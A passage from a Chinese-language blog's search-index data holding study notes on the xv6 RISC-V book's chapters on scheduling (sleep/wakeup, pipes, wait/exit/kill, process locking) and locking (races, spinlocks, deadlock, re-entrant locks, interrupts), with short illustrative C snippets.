channel、将进程状态更改为SLEEPING并调用sched()（kernel/proc.c）来将进程置于sleeping状态。接下来说明为什么要确保在将进程标记为SLEEPING之后，p-\u003elock不能被释放（由调度程序执行）。 在某个时刻，一个进程将获取condition lock，设置等待的条件，并调用wakeup(chan)。重要的是，在持有condition lock[严格来说，如果wakeup()仅仅在获取之后执行（也就是说，在释放之后调用wakeup()），就已经足够了。]的同时调用wakeup()。wakeup()循环遍历进程表（kernel/proc.c）。它获取每个要检查的进程的p-\u003elock，这既是因为它可能会操作该进程的状态，也是因为p-\u003elock确保sleep()和wakeup()不会错过彼此。当wakeup()找到处于SLEEPING状态且channel匹配的进程时，它将该进程的状态更改为RUNNABLE。下次调度程序运行时，它将看到该进程已准备好运行。 为什么sleep()和wakeup()的锁定规则确保sleeping的进程不会错过wakeup呢？sleeping的进程在从检查条件之前的某一点到标记为SLEEPING之后的某一点都持有condition lock或其自身的p-\u003elock或两者都持有。调用wakeup()的进程在wakeup()的循环中持有这两个锁。因此，唤醒者要么在消费线程检查条件之前使条件为真；要么唤醒者的wakeup()在sleeping的线程被标记为SLEEPING之后进行检查。然后就是，wakeup()将看到睡眠的进程并唤醒它（除非有其他东西先唤醒它）。 有时会出现多个进程在同一channel上sleeping的情况；例如，从pipe中读取的多个进程。单次调用wakeup()将唤醒它们所有。其中一个将首先运行并获取sleep()调用时使用的锁，并（在pipe的情况下）读取pipe中等待的任何数据。其他进程将发现，尽管被唤醒，但没有可读取的数据。从它们的角度来看，唤醒是“虚假的”，它们必须再次进入睡眠状态。因此，sleep()总是在检查条件的循环内调用。 如果两个sleep/wakeup的使用意外地选择了相同的channel，也不会造成任何伤害：它们将看到虚假的wakeup，但如上所述的循环将容忍这个问题。sleep/wakeup的魅力之一在于它既轻量级（无需创建用作sleep channel的特殊数据结构），又提供了一层间接性（调用者无需知道它们正在与哪个具体的进程交互）。 ","date":"2023-04-12","objectID":"/posts/xv6_book_chapter_7/:6:0","tags":["Xv6_RISC-V"],"title":"Xv6 book: scheduling","uri":"/posts/xv6_book_chapter_7/"},{"categories":["刷课笔记"],"content":"Code: Pipes 使用sleep()和wakeup()来同步生产者和消费者的更复杂的例子是xv6对pipe的实现。我们在第1章看到了pipe的接口：写入pipe一端的字节被复制到内核缓冲区，然后可以从pipe的另一端读取。未来的章节将研究围绕pipe的文件描述符支持，但现在让我们看一下pipewrite()和piperead()的实现。 每个pipe由一个struct pipe表示，其中包含一个锁和一个数据缓冲区。字段nread和nwrite分别计算从缓冲区读取的总字节数和写入的总字节数。缓冲区是循环的：在buf[PIPESIZE-1]之后写入的下一个字节是buf[0]。计数不会循环。这种约定允许实现区分满缓冲区（nwrite == nread+PIPESIZE）和空缓冲区（nwrite == nread），但这意味着索引到缓冲区必须使用buf[nread % PIPESIZE]而不是简单的buf[nread]（对于nwrite也是如此）。 假设在两个不同的CPU上同时调用piperead()和pipewrite()。pipewrite()（kernel/pipe.c）开始通过获取pipe的锁，该锁保护计数、数据和它们相关的不变性。然后，piperead()（kernel/pipe.c）也尝试获取锁，但无法获取。它在acquire()（kernel/spinlock.c）中自旋等待锁。在piperead()等待期间，pipewrite()循环处理正在写入的字节（addr[0..n-1]），逐个将每个字节添加到pipe中。在此循环期间，缓冲区可能已满。在这种情况下，pipewrite()调用wakeup()来通知任何sleeping的读取器有数据在缓冲区中等待，并在\u0026pi-\u003enwrite上sleep，等待读取器从缓冲区中取出一些字节。sleep()在将pipewrite()的进程置于sleeping状态时释放pi-\u003elock。 现在pi-\u003elock可用，piperead()成功获取它并进入其临界区：它发现pi-\u003enread != pi-\u003enwrite（pipewrite()因为pi-\u003enwrite == pi-\u003enread+PIPESIZE（kernel/pipe.c）而进入睡眠状态），因此它继续执行for循环，从pipe中复制数据，并将nread递增与复制的字节数相同。现在有这么多字节可用于写入，所以piperead()在返回之前调用wakeup()唤醒任何sleeping的写入器。wakeup()找到了一个在\u0026pi-\u003enwrite上sleeping的进程，这个进程曾经运行pipewrite()但在缓冲区填满时停止。它将该进程标记为RUNNABLE。 pipe代码为读取器和写入器使用了不同的sleeping channel（pi-\u003enread和pi-\u003enwrite）；在极少数情况下，如果有很多读取器和写入器在等待相同的pipe，这可能使系统更加高效。pipe代码在循环中sleeping并检查sleep条件；如果有多个读取器或写入器，除了第一个唤醒的进程外，所有进程都会看到条件仍为false，然后再次进入sleeping状态。 ","date":"2023-04-12","objectID":"/posts/xv6_book_chapter_7/:7:0","tags":["Xv6_RISC-V"],"title":"Xv6 book: scheduling","uri":"/posts/xv6_book_chapter_7/"},{"categories":["刷课笔记"],"content":"Code: wait, exit, and kill sleep()和wakeup()可以用于许多类型的等待。一个有趣的例子，在第1章介绍过，是子进程的退出与其父进程的等待之间的交互。在子进程死亡时，父进程可能已经在等待中睡眠，或者正在执行其他操作；在后一种情况下，对wait()的后续调用必须观察到子进程的死亡，可能在它调用exit()后很久。xv6记录子进程的终结直到wait()观察到它的方式是将调用者置于ZOMBIE状态，保持在该状态直到父进程的wait()注意到它，将子进程的状态更改为UNUSED，复制子进程的退出状态，并将子进程的进程ID返回给父进程。如果父进程在子进程之前退出，父进程将子进程交给init进程，后者会不断调用wait()；因此，每个子进程都有一个父进程来清理它。一个挑战是避免在同时进行的父进程和子进程wait()和exit()、以及同时进行的exit()和exit()之间的竞争和死锁。 wait()开始通过获取wait_lock（kernel/proc.c）来实现。原因是wait_lock充当条件锁，有助于确保父进程不会错过来自正在退出的子进程的唤醒。然后，wait()扫描进程表。如果找到一个处于ZOMBIE状态的子进程，它将释放该子进程的资源和其proc结构，将子进程的退出状态复制到wait()提供的地址（如果不为0），并返回子进程的进程ID。如果wait()找到子进程，但没有一个退出，它调用sleep()等待它们中的任何一个退出（kernel/proc.c），然后再次进行扫描。wait()通常持有两个锁，wait_lock和某个进程的pp-\u003elock；为了避免死锁，先获取wait_lock，然后是pp-\u003elock。 exit()（kernel/proc.c）记录退出状态，释放一些资源，调用reparent()将其子进程交给init进程，唤醒父进程，标记调用者为僵尸状态，并永久性地让出CPU。exit()在此序列期间持有wait_lock和p-\u003elock这两个锁。它持有wait_lock是因为它是唤醒（wakeup(p-\u003eparent)）的条件锁，防止处于wait()状态的父进程错过唤醒。exit()必须持有p-\u003elock以防止处于wait()状态的父进程在子进程最终调用swtch()之前就看到子进程处于ZOMBIE状态。exit()以与wait()相同的顺序获取这些锁，以避免死锁。 虽然将状态设置为ZOMBIE之前唤醒父进程看起来不太正确，但这是安全的：尽管wakeup()可能导致父进程运行，但wait()的循环不能在子进程的p-\u003elock被调度程序释放之前检查子进程，因此wait()无法在exit()将其状态设置为ZOMBIE之后很快查看正在退出的进程（kernel/proc.c:）。 虽然exit()允许一个进程终止自己，但kill()（kernel/proc.c）允许一个进程请求另一个进程终止。直接销毁被kill的进程进程对于kill()来说可能过于复杂，因为被kill的进程可能正在另一个CPU上执行，可能正在对内核数据结构进行必要的操作。因此，kill()几乎什么都不做：它只是设置被kill的进程的p-\u003ekilled，如果它正在sleep，就wakeup。最终，被kill的进程将进入或离开内核，此时在usertrap()中的代码将在p-\u003ekilled被设置时调用exit()（通过调用killed()来检查（kernel/proc.c））。如果被kill的进程正在用户空间运行，它将很快通过发出系统调用或者由于时钟（或其他设备）中断而进入内核。 如果被kill的进程进程正在sleep，kill()调用wakeup()将导致被kill的进程从sleep中返回。这是个危险操作，因为等待的条件可能不成立。然而，xv6对sleep()的调用总是包装在一个while循环中，在sleep()返回后重新测试条件。一些对sleep()的调用还在循环中测试p-\u003ekilled，并在其被设置时放弃当前的活动。这只有在这种放弃是正确的情况下才会这样做。例如，pipe读写代码在killed标志被设置时返回；最终，该代码将返回到trap，trap将再次检查p-\u003ekilled并调用exit()。 一些xv6的sleep()循环不检查p-\u003ekilled，因为代码正在进行多步的系统调用，这应该是原子的。virtio驱动程序（kernel/virtio_disk.c）就是一个例子：它不检查p-\u003ekilled，因为磁盘操作可能是需要一组写操作的其中一个，这些写操作都是为了让文件系统保持在正确状态。等待磁盘I/O的进程直到完成当前的系统调用并且usertrap()看到killed标志时才会退出。 ","date":"2023-04-12","objectID":"/posts/xv6_book_chapter_7/:8:0","tags":["Xv6_RISC-V"],"title":"Xv6 book: scheduling","uri":"/posts/xv6_book_chapter_7/"},{"categories":["刷课笔记"],"content":"Process Locking 每个进程关联的锁（p-\u003elock）是xv6中最复杂的锁之一。对于p-\u003elock的一个简单理解是，当读取或写入以下任何struct proc字段时，必须持有该锁：p-\u003estate、p-\u003echan、p-\u003ekilled、p-\u003exstate和p-\u003epid。这些字段可能被其他进程或其他核上的调度程序线程使用，因此自然而然地需要通过锁进行保护。 然而，p-\u003elock的大多数用途是保护xv6进程数据结构和算法的更高级别方面。以下是p-\u003elock所做的全部工作： 与p-\u003estate一起，防止在为新进程分配proc[]时出现竞争。 在创建或销毁过程中，将进程隐藏。 防止父进程的wait()发现已将其状态设置为ZOMBIE但尚未让出CPU的进程。 防止另一个核心的调度程序在将其状态设置为RUNNABLE但在完成swtch()之前决定运行yield进程。 确保只有一个核心的调度程序决定运行RUNNABLE进程。 防止时钟中断在进程处于swtch()状态时导致其让出CPU。 与condition lock一起，有助于防止wakeup()忽视正在调用sleep()但尚未完成CPU让出的进程。 防止被kill的进程进程退出，可能在kill()检查p-\u003epid并设置p-\u003ekilled之间被重新分配。 使kill()的p-\u003estate的检查和写入是原子的。 p-\u003eparent字段由全局锁wait_lock保护，而不是由p-\u003elock保护。只有进程的父进程才能修改p-\u003eparent，尽管该字段既被进程本身读取，也被其他搜索其子进程的进程读取。wait_lock的目的是在等待任何子进程退出时作为条件锁定，当wait()休眠等待任何子进程退出时使用。退出的子进程会持有wait_lock或p-\u003elock，直到将其状态设置为ZOMBIE、唤醒其父进程并让出CPU之后才释放。wait_lock还序列化父进程和子进程的并发退出，以确保init进程（继承该子进程）被唤醒等待。wait_lock是全局锁，而不是每个父进程中的每个进程锁，因为在进程获取它之前，它无法知道它的父进程是谁。 ","date":"2023-04-12","objectID":"/posts/xv6_book_chapter_7/:9:0","tags":["Xv6_RISC-V"],"title":"Xv6 book: scheduling","uri":"/posts/xv6_book_chapter_7/"},{"categories":["刷课笔记"],"content":"Real world xv6调度程序实现了一种简单的调度策略，即按顺序运行每个进程的轮转调度策略，也称为循环调度。真实的操作系统实现了更复杂的调度策略，例如允许进程具有优先级。其思想是可运行的高优先级进程将优先于可运行的低优先级进程。这些策略可能会迅速变得复杂，因为通常存在竞争的目标：例如，操作系统可能还希望保证公平性和高吞吐量。此外，复杂的策略可能导致意外的交互，如优先级反转和车队。优先级反转可能发生在低优先级和高优先级进程都使用特定锁的情况下，当低优先级进程获取锁时，可能阻止高优先级进程取得进展。当许多高优先级进程等待获取由低优先级进程获取的共享锁时，可能形成长时间的车队。为了避免这些问题，复杂调度程序中需要额外的机制。 sleep和wakeup是一种简单而有效的同步方法，但还有许多其他方法。在所有这些方法中的第一个挑战是避免我们在本章开头看到的lost wakeup问题。最初的Unix内核的sleep()简单地禁用中断，这足够因为Unix在单CPU系统上运行。由于xv6在多处理器上运行，它为sleep()添加了一个显式的锁。FreeBSD的msleep()采用相同的方法。Plan 9的sleep()使用一个回调函数，在进入sleep前持有调度锁；该函数用作睡眠条件的最后一分钟检查，以避免lost wakeup。Linux kernel的sleep()使用一个显式的进程队列，称为wait queue，而不是wait channel；wait queue有其自己的内部锁。 在wakeup()中扫描整个进程集是低效的。更好的解决方案是在sleep()和wakeup()中都用一个数据结构来替代chan，该结构保存了在该结构上休眠的进程列表，例如Linux的wait queue。Plan 9的sleep()和wakeup()将该结构称为rendezvous point。许多线程库将相同的结构称为条件变量；在这个context中，操作sleep()和wakeup()被称为wait和signal。所有这些机制都共享相同的特征：sleep condition在某种锁的保护下，在sleeping期间以原子方式释放。 wakeup()的实现会唤醒在特定channel上等待的所有进程，而可能存在许多进程正在等待该特定通道。操作系统将安排所有这些进程，它们将竞争检查sleep condition。以这种方式行为的进程有时被称为thundering herd，最好避免。大多数条件变量都有两个wakeup()的primitives：signal用于唤醒一个进程，broadcast用于唤醒所有等待的进程。 semaphores通常用于同步。count通常对应于pipe缓冲区中可用的字节数或进程具有的僵尸子进程的数量之类的内容。在抽象的一部分使用显式计数可以避免lost wakeup问题：有一个明确的计数表示已发生的唤醒次数，这样count还避免了虚假唤醒和thundering herd问题。 在xv6中，终止进程并清理它们引入了很多复杂性。在大多数操作系统中，这甚至更加复杂，因为例如，被kill的进程进程可能深入内核中休眠，展开其堆栈需要谨慎，因为调用堆栈上的每个函数可能需要进行一些清理。一些语言通过提供exception机制来帮助处理这个问题，但C语言不支持。此外，还有其他事件可能导致一个正在休眠的进程被唤醒，即使它正在等待的事件尚未发生。例如，当Unix进程正在休眠时，另一个进程可能向其发送信号。在这种情况下，进程将以值-1和错误代码设置为EINTR从被中断的系统调用返回。应用程序可以检查这些值并决定如何处理。Xv6不支持信号，因此不涉及这种复杂性。 Xv6对kill()的支持并不完善：存在可能应该检查p-\u003ekilled的sleep()循环。一个相关的问题是，即使对于检查p-\u003ekilled的sleep()循环，sleep()和kill()之间依旧存在竞争；后者可能设置p-\u003ekilled并尝试在被kill的进程的循环检查p-\u003ekilled之后但在调用sleep()之前唤醒被kill的进程。如果发生这个问题，被kill的进程在等待的条件发生之前可能不会注意到p-\u003ekilled。这可能会相当长的时间，甚至永远不会发生（例如，如果被kill的进程正在等待从console输入，但用户没有输入任何内容）。 一个真实的操作系统会在常数时间内使用显式的空闲进程结构列表找到空闲的proc结构，而不是使用allocproc()中的线性搜索；xv6出于简单起见使用线性扫描。 ","date":"2023-04-12","objectID":"/posts/xv6_book_chapter_7/:10:0","tags":["Xv6_RISC-V"],"title":"Xv6 book: scheduling","uri":"/posts/xv6_book_chapter_7/"},{"categories":["刷课笔记"],"content":"Xv6 book 的第六章节","date":"2023-04-09","objectID":"/posts/xv6_book_chapter_6/","tags":["Xv6_RISC-V"],"title":"Xv6 book: Locking","uri":"/posts/xv6_book_chapter_6/"},{"categories":["刷课笔记"],"content":"Xv6 book 的第六章节 Locking 现在的大多数包括 xv6 在内的内核会交错执行多个进程。这里面有多处理器硬件的功劳：拥有多个独立执行的CPU的计算机，例如 xv6 的 RISC-V。这些多个 CPU 共享物理 RAM，而 xv6 利用这种共享来维护所有 CPU 都读写的数据结构。这种共享可能导致一个 CPU 在另一个 CPU 正在更新它时读取数据结构，甚至可能多个 CPU 同时更新相同的数据；如果没有经过精心设计，这样的并发访问可能会产生不正确的结果或损坏数据结构。即使在单处理器上，内核也可能在多个线程之间切换 CPU，导致它们的执行交错进行。最后，一个设备中断处理程序可能会修改与一些可中断代码相同的数据，如果中断发生的时间不对，可能会损坏数据。并发这个词指的是由于多处理器并行性、线程切换或中断而导致多个指令流交错的情况。 内核中充斥着可同时访问的数据。例如，两个CPU可能同时调用 kalloc()，从而同时从空闲列表的头部弹出。内核设计者喜欢允许大量并发，因为它可以通过并行性提高性能和增加响应能力。可惜结果证明，内核设计者必须在存在这种并发性的情况下确保正确性才行。有许多实现正确代码的方法，其中一些比其他方法更容易推理。旨在在并发情况下确保正确性的策略和支持它们的抽象称为并发控制(concurrency control)技术。 Xv6使用了多种并发控制技术，具体取决于情况；还有许多其他可能的技术。本章重点介绍一种广泛使用的技术：锁。锁提供互斥，确保一次只有一个 CPU 可以持有锁。如果程序员将每个共享数据项与一个锁关联，并且在使用该项时代码始终持有相关的锁，那么该项将一次只由一个 CPU 使用。在这种情况下，可以认为该锁保护数据项。尽管锁是一种容易理解的并发控制机制，但锁的缺点是它们可能限制性能，因为它们会串行化并发操作。 该章节剩下的部分会介绍 xv6 为什么需要锁，锁是如何实现的以及如何使用锁。 ","date":"2023-04-09","objectID":"/posts/xv6_book_chapter_6/:0:0","tags":["Xv6_RISC-V"],"title":"Xv6 book: Locking","uri":"/posts/xv6_book_chapter_6/"},{"categories":["刷课笔记"],"content":"Races 假设两个在两个不同CPU上调用 wait() 的已退出的子进程。wait() 会释放子进程的内存。因此，在每个CPU上，内核将调用 kfree() 来释放子进程的内存页。内核分配器维护一个链表：kalloc()（kernel/kalloc.c）从空闲页面列表中pop内存页面，而 kfree()将一个页面 push到空闲列表中。为了获得最佳性能，我们可能希望两个父进程的 kfrees 在没有等待对方的情况下并行执行，但考虑到 xv6 的 kfree() 实现，这是不正确的。 图 6.1 更详细地说明了这个设置：空闲页面的链表位于两个 CPU 共享的内存中，它们使用加载和存储指令来操作列表。（实际上，处理器具有缓存，但在概念上，多处理器系统的行为就好像存在一个单一的共享内存。）如果没有并发请求，您可以将列表推送操作实现如下： struct element { int data; struct element *next; }; struct element *list = 0; void push(int data) { struct element *l; l = malloc(sizeof *l); l-\u003edata = data; l-\u003enext = list; list = l; } 这个实现在独立执行时是正确的。然而，如果有多个副本同时执行，那么这段代码就不正确了。如果两个CPU同时执行 push()，两者都可能在图 6.1 中的第 15 行执行之前执行第 16 行，这将导致不正确的结果，如图 6.2 所示。然后将会有两个列表元素，它们的 next 设置为列表的先前值。当在第16行发生两次对列表的赋值时，第二次将覆盖第一次；参与第一次赋值的元素将会丢失。 第 16 行的丢失更新是竞争的一个例子。竞争是一种情况，其中内存位置被同时访问，而至少有一个访问是写入。竞争通常是错误的迹象，可能是丢失更新（如果访问是写入）或对未完全更新的数据结构进行读取。 竞争的结果取决于编译器生成的机器代码、涉及的两个 CPU 的时序以及它们的内存操作由内存系统如何排序，这可能使由竞争引起的错误难以复现和调试。例如，在调试 push 时添加打印语句可能会改变执行的时序，足以使竞争消失。 避免竞争的通常方法是使用锁。锁确保互斥性，以便一次只有一个 CPU 可以执行 push() 的敏感行；这使得上述情景成为不可能。上述代码的正确加锁版本只需添加几行（修改的那行添加了注释符）： struct element *list = 0; struct lock listlock; // void push(int data) { struct element *l; l = malloc(sizeof *l); l-\u003edata = data; acquire(\u0026listlock); // l-\u003enext = list; list = l; release(\u0026listlock); // } 在 acquire() 和 release() 之间的指令序列通常被称为 critical section。通常说锁是在保护列表。 当我们说一个锁保护数据时，我们实际上是指该锁保护一些适用于数据的不变量。不变量是在操作之间维护的数据结构的属性。通常，一个操作的正确行为取决于不变量在操作开始时为真。操作可能会暂时违反不变量，但必须在完成之前重新确立它们。例如，在链表的情况下，不变量是列表指向列表中的第一个元素，每个元素的 next 字段指向下一个元素。push() 的实现会暂时违反这个不变量：在第 12 行，l 指向下一个列表元素，但 list 还没有指向 l（在第13行重新建立）。我们上面检查的竞争发生是因为第二个CPU执行了依赖于列表不变量的代码，而这些不变量在那时是（暂时）违反的。正确使用锁确保一次只有一个 CPU 可以在 critical section 对数据结构进行操作，因此当数据结构的不变量不成立时，没有 CPU 会执行数据结构操作。 你可以把锁看作是串行化并发的 critical section，使它们一次只运行一个，从而保持不变量（假设 critical section 在隔离状态下是正确的）。你还可以将由同一把锁保护的 critical section 视为相互原子化，因此每个 critical section 只看到之前 critical section 的完整更改集，并且永远不会看到部分完成的更新。 尽管锁对于程序正确性而言很有用，但其本质上限制了性能。例如，如果两个进程同时调用 kfree()，锁将串行化这两个 critical section，因此在不同的 CPU 上运行它们不会带来任何好处。如果多个进程在同一时间想要相同的锁，或者说锁经历争用就很难绷。内核设计中的一个主要挑战就是在追求并行性时避免锁的争用。Xv6 在这方面做得不多，但复杂的内核会组织数据结构和算法，专门为了避免锁的争用。在这个 list 示例中，内核可以为每个 CPU 维护一个单独的空闲列表，只有在当前 CPU 的列表为空且必须从另一个 CPU 中窃取内存时才触及另一个 CPU 的空闲列表。其他用例可能需要更复杂的设计。 锁的位置对性能也很重要。例如，将 acquire() 移到 push() 的较早位置（在第 8 行之前）是正确的。但这可能会降低性能，因为调用 malloc() 的操作会被串行化。下面的 “Using locks” 部分提供了一些建议，指导何时插入 acquire() 和 release() 调用。 ","date":"2023-04-09","objectID":"/posts/xv6_book_chapter_6/:1:0","tags":["Xv6_RISC-V"],"title":"Xv6 book: Locking","uri":"/posts/xv6_book_chapter_6/"},{"categories":["刷课笔记"],"content":"Code: Locks Xv6 拥有两种类型的锁：自旋锁（spinlocks）和睡眠锁（sleep-locks）。我们先从自旋锁开始。Xv6 将自旋锁表示为一个结构体 spinlock（kernel/spinlock.h）。结构体中的重要字段是 locked，它在锁可被使用时为零，在锁被持有时为非零。从逻辑上讲，xv6 应该通过执行类似以下代码来获取锁： void acquire(struct spinlock *lk) // does not work! { for(;;) { if(lk-\u003elocked == 0) { lk-\u003elocked = 1; break; } } } 不幸的是，这个实现在多处理器上不能保证互斥性。可能发生两个 CPU 同时到达第 5 行，看到 lk-\u003elocked 为零，然后都执行第 6 行抓住锁。在这一点上，两个不同的 CPU 都持有锁，违反了互斥性质。我们需要的是一种使第 5 行和第 6 行执行为一个原子（即不可分割）步骤的方法。 由于锁被广泛使用，多核处理器通常提供实现第5和第6行的原子版本的指令。在 RISC-V 上，这个指令是 amoswap r, a。amoswap： 读取内存地址 a 处的值，将寄存器 r 的内容写入该地址，并将它读取的值放入 r。也就是说，它交换了寄存器和内存地址的内容。它使用特殊的硬件以原子方式执行此序列，防止任何其他CPU在读取和写入之间使用内存地址。 Xv6 的 acquire()（kernel/spinlock.c）使用了可移植的 C 库调用 __sync_lock_test_and_set()，它编译为 amoswap 指令；返回值是 lk-\u003elocked 之前（交换的）的内容。acquire() 函数将交换包装在一个循环中，一直循环尝试（自旋）直到它获取了锁。每次迭代都将一个值交换到 lk-\u003elocked 中并检查先前的值；如果先前的值为0，那么我们已经获取了锁，交换会将 lk-\u003elocked 设置为 1。如果先前的值为 1，那么某个其他 CPU 持有锁，而我们将1原子地交换到 lk-\u003elocked 中并不会改变它的值。 一旦获得锁，acquire() 函数为调试记录获取锁的 CPU。lk-\u003ecpu 字段受到锁的保护，必须在持有锁的情况下才能更改。release() 函数（kernel/spinlock.c）是 acquire() 函数的相反操作：它清除 lk-\u003ecpu 字段，然后释放锁。从概念上讲，释放只需要将 0 赋给 lk-\u003elocked。C 标准允许编译器使用多个存储指令来实现赋值，因此C赋值可能在并发代码方面不是原子的。所以，release() 使用 C 库函数 __sync_lock_release()，执行原子的赋值操作。 ","date":"2023-04-09","objectID":"/posts/xv6_book_chapter_6/:2:0","tags":["Xv6_RISC-V"],"title":"Xv6 book: Locking","uri":"/posts/xv6_book_chapter_6/"},{"categories":["刷课笔记"],"content":"Code: Using locks 使用锁的难点在于决定使用多少锁以及每个锁应该保护哪些数据和不变量。有一些基本原则。首先，每当一个变量可以被一个 CPU 写入的同时另一个 CPU 可以读取或写入它时，应该使用锁以防止这两个操作重叠。其次，要记住锁保护不变量：如果一个不变量涉及多个内存位置，通常需要通过一个单一的锁来保护它们，以确保保持不变量。 上述规则说明了何时需要锁，但没有提到何时不需要锁，而且不锁定太多是很重要的，因为锁会降低并行性。如果并行性不重要，那么可以安排只有一个线程，而不用担心锁。在多处理器上，一个简单的内核可以通过具有单一锁来实现这一点，该锁在进入内核时必须获取，并在退出内核时释放（尽管阻塞系统调用（如 pipe read 或 wait）可能会带来问题）。许多单处理器操作系统已经通过这种方法转换为在多处理器上运行，有时被称为 “big kernel lock”，但这种方法牺牲了并行性：一次只能有一个CPU在内核中执行。如果内核进行了大量计算，使用更大一组更细粒度的锁可能更有效，以便内核可以在多个 CPU 上同时执行。 作为粗粒度锁定的一个例子，xv6的 kalloc.c 分配器具有一个由单一锁保护的空闲列表。如果不同 CPU 上的多个进程尝试同时分配页面，每个进程都必须通过在 acquire() 中自旋等待。自旋会浪费 CPU 的时间。如果 CPU 多数时候都用来自旋，也许通过更改分配器设计，使用多个具有各自锁的空闲列表，以允许真正并行的分配，性能可能会得到改善。 作为细粒度锁定的一个例子，xv6 为每个文件都有一个单独的锁，这样处理不同文件的进程通常可以在不等待对方锁的情况下继续执行。如果希望允许进程同时写同一文件的不同区域，文件锁定方案可以变得更加细粒度。最终，锁的颗粒度需要在性能和复杂性之间权衡。 随着后续章节对 xv6 的每个部分进行解释，它们将提到 xv6 在处理并发时使用锁的例子。作为预览，图 6.3 列出了 xv6 中的所有锁。 ","date":"2023-04-09","objectID":"/posts/xv6_book_chapter_6/:3:0","tags":["Xv6_RISC-V"],"title":"Xv6 book: Locking","uri":"/posts/xv6_book_chapter_6/"},{"categories":["刷课笔记"],"content":"Deadlock and lock ordering 如果通过内核的代码执行流必须同时持有多个锁，那么很重要的一点是所有代码执行流以相同的顺序获取这些锁。如果不这样做，就有发生死锁的风险。假设 xv6 中有两个代码执行流需要锁 A 和 B，但代码执行流 1 按照 A 然后 B 的顺序获取锁，而另一条路径按照 B 然后 A 的顺序获取锁。假设线程 T1 执行代码执行流 1 并获取锁 A，线程 T2 执行代码执行流 2 并获取锁 B。接下来，T1 将尝试获取锁 B，而 T2 将尝试获取锁 A。两者都将无限期地阻塞，因为在两种情况下，另一个线程持有所需的锁，并且在其获取返回之前不会释放它。为了避免这种死锁，所有代码执行流必须以相同的顺序获取锁。对全局锁获取顺序的需求意味着锁实际上是每个函数规范的一部分：调用者必须以使锁按约定的顺序获取的方式调用函数。 在 xv6 中，由于 sleep 的工作方式（参见第7章），涉及每个进程锁（每个 struct proc 中的锁）的长度为两的锁顺序链很多。例如，consoleintr（kernel/console.c）是处理键入字符的中断处理程序。当输入换行符时，任何等待console输入的进程都应该被唤醒。为了实现这一点，consoleintr() 在调用 wakeup() 时持有 cons.lock，而 wakeup() 获取等待进程的锁以唤醒它。因此，全局避免死锁的锁顺序规则包括 cons.lock 必须在任何进程锁之前获取。文件系统代码包含了 xv6 最长的锁链。例如，创建文件需要同时持有目录的锁、新文件的 inode 的锁、磁盘块缓冲区的锁、磁盘驱动程序的 vdisk_lock，以及调用进程的 p-\u003elock。为了避免死锁，文件系统代码总是按照前文提到的顺序获取锁。 遵守全局避免死锁的顺序可能会让人感觉很难绷。有时，锁顺序与逻辑程序结构冲突，例如，可能代码模块 M1 调用模块 M2，但锁顺序要求在 M1 中获取一个锁之前必须获取 M2 中的一个锁。有时，锁的身份事先不知道，可能是因为必须持有一个锁以便发现下一个要获取的锁的身份。这种情况在文件系统中查找路径名中的连续组件时以及在 wait() 和 exit() 的代码中搜索进程表以查找子进程时会出现。最后，死锁的危险通常限制了锁定方案的细粒度，因为更多的锁通常意味着更多的死锁机会。避免死锁的需要通常是内核实现的一个重要因素。 ","date":"2023-04-09","objectID":"/posts/xv6_book_chapter_6/:4:0","tags":["Xv6_RISC-V"],"title":"Xv6 book: Locking","uri":"/posts/xv6_book_chapter_6/"},{"categories":["刷课笔记"],"content":"Re-entrant locks 可能会觉得通过使用可重入锁（也称为递归锁）可以避免一些死锁和锁定顺序的挑战。这个想法是，如果一个进程持有锁，并且该进程尝试再次获取锁，那么内核可以允许这样做（因为进程已经持有锁），而不是像 xv6 内核那样调用 panic。 然而，事实证明可重入锁使得推理并发性变得更加困难：可重入锁破坏了锁导致 critical section 在其他 critical section 是原子的直觉。考虑以下两个函数 f() 和 g()： struct spinlock lock; int data = 0; // protected by lock f() { acquire(\u0026lock); if(data == 0){ call_once(); h(); data = 1; } release(\u0026lock); } g() { aquire(\u0026lock); if(data == 0){ call_once(); data = 1; } release(\u0026lock); } 观察这段代码片段，直觉是 call_once() 只会被调用一次：要么由 f() 调用，要么由 g() 调用，但不会两者兼有。 但是如果允许可重入锁，并且 h() 恰好调用 g()，那么 call_once() 将被调用两次。如果不允许可重入锁，那么 h() 调用 g() 将导致死锁，这也不太好。但是，假设调用 call_once() 将是一个严重错误，那么死锁更可取。内核开发人员将观察到死锁（内核恢复到 panic 状态），并可以修改代码以避免它，而调用 call_once() 两次可能会悄悄产生难以追踪的错误。 出于这个原因，xv6 使用更简单易懂的非可重入锁。然而，只要程序员记住锁定规则，两种方法都可以使其正常工作。如果 xv6 使用可重入锁，就必须修改 acquire()，以注意到锁当前由调用线程持有。还必须向 struct spinlock 添加一个嵌套获取的计数，类似于接下来将要讨论的 push_off。 ","date":"2023-04-09","objectID":"/posts/xv6_book_chapter_6/:5:0","tags":["Xv6_RISC-V"],"title":"Xv6 book: Locking","uri":"/posts/xv6_book_chapter_6/"},{"categories":["刷课笔记"],"content":"Locks and interrupt handlers 一些 xv6 的自旋锁保护着同时由线程和中断处理程序使用的数据。例如，clockintr() 时钟中断处理程序可能会在大约同一时间递增 ticks（kernel/trap.c），而内核线程在 sys_sleep()（kernel/sysproc.c）中读取 ticks。锁 tickslock 串行化了这两个访问。 自旋锁和中断的交互引发了潜在的危险。假设 sys_sleep() 持有 tickslock，并且它的 CPU 被时钟中断。clockintr() 将尝试获取 tickslock，看到它被持有，并等待释放。在这种情况下，tickslock 将永远不会被释放：只有 sys_sleep() 才能释放它，但 sys_sleep() 不会继续运行，直到 clockintr() 返回。因此，CPU 将死锁，需要锁的任何代码也将被冻结。 为了避免这种情况，如果一个自旋锁被中断处理程序使用，CPU 绝不能在启用中断的情况下持有该锁。Xv6 更加保守：当一个 CPU 获取任何锁时，xv6 总是在该 CPU 上禁用中断。中断仍然可能发生在其他 CPU 上，因此中断的获取可以等待线程释放自旋锁；只是不能在同一个 CPU 上等待。 当 CPU 不持有自旋锁时，xv6 会重新启用中断；它必须进行一些簿记以处理critical section。acquire() 调用 push_off()，而 release() 调用 pop_off()来跟踪当前 CPU 上锁的嵌套级别。当该计数达到零时，pop_off() 将恢复在最外层critical section开始时存在的中断使能状态。intr_off() 和 intr_on() 函数分别执行 RISC-V 指令以禁用和启用中断。 在设置 lk-\u003elocked 之前，acquire() 必须严格调用 push_off()。如果两者颠倒，那么在打开中断的情况下持有锁的短暂窗口将出现，而一个不幸时机的中断可能会导致系统死锁。release() 也是在释放锁之后才能调用 pop_off()。 ","date":"2023-04-09","objectID":"/posts/xv6_book_chapter_6/:6:0","tags":["Xv6_RISC-V"],"title":"Xv6 book: 